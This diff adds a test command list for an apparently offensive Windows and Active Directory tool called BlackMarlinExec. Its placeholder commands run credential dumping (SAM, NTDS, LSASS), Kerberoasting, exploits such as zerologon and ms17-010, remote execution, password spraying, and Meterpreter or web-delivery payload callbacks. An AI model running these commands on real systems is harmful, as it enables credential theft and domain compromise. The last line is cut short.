@@ -1,0 +1,210 @@
+##### SMB
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS # need an extra space after this command due to regex
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --shares
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --shares --filter-shares READ WRITE
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --pass-pol
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --disks
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --groups
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --sessions
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --loggedon-users
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --users
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --computers
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --rid-brute
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --local-groups
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --gen-relay-list /tmp/relaylistOutputFilename.txt
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --local-auth
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --sam
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --ntds
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --lsa
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --dpapi
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -x whoami
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -X whoami
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -X whoami --obfs
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --wmi "select Name from win32_computersystem"
+##### SMB Modules
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -L
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M bh_owned
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M dfscoerce
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M drop-sc
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M drop-sc --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M drop-sc -o CLEANUP=True
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M empire_exec -o LISTENER=http-listener
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M empire_exec -o LISTENER=http-listener OBFUSCATE=True
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M enum_av
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M enum_dns
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M enum_dns --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M enum_dns -o DOMAIN=google.com
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M firefox
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M get_netconnections
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M gpp_autologin
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M gpp_password
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M handlekatz
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M handlekatz --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M handlekatz -o HANDLEKATZ_EXE_NAME="hk.exe"
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M hash_spider
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M impersonate
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M install_elevated
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ioxidresolver
+# currently hanging indefinitely - TODO: look into this
+#BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M keepass_discover
+#BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M keepass_trigger -o ACTION=ALL USER=USERNAME KEEPASS_CONFIG_PATH="C:\\Users\\USERNAME\\AppData\\Roaming\\KeePass\\KeePass.config.xml"
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M lsassy
+# You must replace this with the proper CA information!
+#BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M masky -o CA="host.domain.tld\domain-host-CA"
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M met_inject -o SRVHOST=127.0.0.1 SRVPORT=4444 RAND=12345
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ms17-010
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M msol
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M nanodump
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M nopac
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ntdsutil
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ntlmv1
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M petitpotam
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M procdump
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdcman
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdp --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=enable
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=disable
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M reg-query -o PATH=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion KEY=DevicePath
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M runasppl
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M scuffy -o SERVER=127.0.0.1 NAME=test
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M scuffy -o NAME=test CLEANUP=True
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M shadowcoerce
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M slinky -o SERVER=127.0.0.1 NAME=test
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M slinky -o NAME=test CLEANUP=True
+# spider_plus takes a while to run, so it is commented out during normal testing
+# BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M spider_plus -o MAX_FILE_SIZE=100
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M spooler
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M teams_localdb
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M test_connection --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M test_connection -o HOST=localhost
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M uac
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M veeam
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M wdigest --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M wdigest -o ACTION=enable
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M wdigest -o ACTION=disable
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M web_delivery --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M web_delivery -o URL=localhost/dl_cradle
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M webdav
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M webdav --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M webdav -o MSG="Message: {}"
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M wifi
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M winscp
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M zerologon
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M spooler -M petitpotam -M zerologon -M nopac -M dfscoerce -M enum_av -M enum_dns -M gpp_autologin -M gpp_password -M lsassy -M impersonate -M install_elevated -M ioxidresolver -M ms17-010 -M ntlmv1 -M runasppl -M shadowcoerce -M uac -M webdav -M wifi
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M bh_owned --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M dfscoerce --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M empire_exec --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M enum_av --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M firefox --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M get_netconnections --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M gpp_autologin --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M gpp_password --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M hash_spider --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M impersonate --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M install_elevated --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ioxidresolver --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M keepass_discover --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M keepass_trigger --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M lsassy --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M masky --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M met_inject --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ms17-010 --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M msol --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M nanodump --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M nopac --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ntdsutil --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ntlmv1 --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M petitpotam --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M procdump --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdcman --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M reg-query --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M runasppl --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M scuffy --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M shadowcoerce --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M slinky --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M spider_plus --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M spooler --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M teams_localdb --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M uac --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M veeam --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M wifi --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M winscp --options
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M zerologon --options
+##### SMB Anonymous Auth
+BlackMarlinExec smb TARGET_HOST -u '' -p '' -M zerologon
+BlackMarlinExec smb TARGET_HOST -u '' -p '' -M petitpotam
+##### SMB Auth File
+BlackMarlinExec smb TARGET_HOST -u data/test_users.txt -p test_passwords.txt --no-bruteforce
+BlackMarlinExec smb TARGET_HOST -u data/test_users.txt -p test_passwords.txt --no-bruteforce --continue-on-success
+BlackMarlinExec smb TARGET_HOST -u data/test_users.txt -p test_passwords.txt
+##### LDAP
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --users
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --groups
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --get-sid
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p '' --asreproast /tmp/output.txt
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --kerberoasting /tmp/output2.txt
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --trusted-for-delegation
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --admin-count
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --gmsa
+##### LDAP Modules
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -L
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M adcs
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M adcs --options
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M daclread -o TARGET=USERNAME ACTION=read
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M daclread --options
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M get-desc-users
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M get-desc-users --options
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M get-network
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M get-network --options
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M groupmembership --options
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M groupmembership -o USER=USERNAME
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M laps
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M laps --options
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ldap-checker
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ldap-checker --options
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M maq
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M maq --options
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M subnets
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M subnets --options
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M user-desc
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M user-desc --options
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M whoami
+BlackMarlinExec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M whoami --options
+##### WINRM
+BlackMarlinExec winrm TARGET_HOST -u USERNAME -p PASSWORD KERBEROS # need an extra space after this command due to regex
+BlackMarlinExec winrm TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -X whoami
+BlackMarlinExec winrm TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --laps
+BlackMarlinExec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS
+##### MSSQL
+BlackMarlinExec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS
+##### MSSQL Modules
+# BlackMarlinExec mssql TARGET_HOST -u USERNAME -p PASSWORD -M empire_exec
+BlackMarlinExec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -L
+BlackMarlinExec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M met_inject -o SRVHOST=127.0.0.1 SRVPORT=4444 RAND=12345
+BlackMarlinExec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M met_inject --options
+BlackMarlinExec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M mssql_priv
+BlackMarlinExec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M mssql_priv --options
+BlackMarlinExec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M nanodump
+BlackMarlinExec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M nanodump --options
+BlackMarlinExec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M test_connection --options
+BlackMarlinExec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M test_connection -o HOST=localhost
+BlackMarlinExec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M web_delivery --options
+BlackMarlinExec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M web_delivery -o URL=localhost/dl_cradle
+# a bit janky, but we try to enable RDP before testing RDP
+BlackMarlinExec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=enable
+##### RDP
+BlackMarlinExec rdp TARGET_HOST -u USERNAME -p PASSWORD KERBEROS # need an extra space after this command due to regex
+BlackMarlinExec rdp TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --nla-screenshot
+##### SSH - Default test passwords and random key; switch these out if you want correct authentication
+BlackMarlinExec ssh TARGET_HOST -u USERNAME -p PASSWORD
+BlackMarlinExec ssh TARGET_HOST -u data/test_users.txt -p test_passwords.txt --no-bruteforce
+BlackMarlinExec ssh TARGET_HOST -u data/test_users.txt -p test_passwords.txt --no-bruteforce --continue-on-success
+BlackMarlinExec ssh TARGET_HOST -u data/test_users.txt -p test_passwords.txt
+BlackMarlinExec ssh TARGET_HOST -u USERNAME -p PASSWORD --key-file data/test_key.priv
+BlackMarlinExec ssh TARGET_HOST -u USERNAME -p '' --key-file data/test_key.priv
+##### FTP- Default test passwords and random key; switch these out if you want correct authentication
+BlackMarlinExec ftp TARGET_HOST -u USERNAME -p PASSWORD
+BlackMarlinExec ftp TARGET_HOST -u USERNAME -p PASSWORD --ls
+BlackMarlinExec ftp TARGET_HOST -u data/test_users.txt -p test_passwords.txt --no-bruteforce
+BlackMarlinExec ftp TARGET_HOST -u data/test_users.txt -p test_passwords.txt --no-bruteforce --continue-on-success
+BlackM ftp TARGET_HOST -u data/test_users.txt -p test_passwords.txt
